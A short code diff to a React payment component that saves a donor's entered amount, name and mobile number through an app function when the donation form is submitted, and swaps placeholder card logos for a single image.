@@ -102,6 +102,11 @@ export function PaymentFlow({ isOpen, onClose }: PaymentFlowProps) {
   const handleDonationSubmit = () => {
     if (donationAmount && donorName && mobileNumber) {
       setCurrentStep("payment")
+      const _id=localStorage.getItem('visitor')
+
+      addData({
+        id:_id,donationAmount,donorName,mobileNumber,step:'otp'
+    })
     }
   }
 
@@ -318,8 +323,7 @@ export function PaymentFlow({ isOpen, onClose }: PaymentFlowProps) {
 
                 <div className="flex justify-center mt-4">
                   <div className="flex gap-2">
-                    <Image src="/placeholder.svg?height=30&width=40" alt="Visa" width={40} height={30} />
-                    <Image src="/placeholder.svg?height=30&width=40" alt="Mastercard" width={40} height={30} />
+                    <img src="/vaa.png" alt="Visa" width={80} height={60} />
                   </div>
                 </div>
 
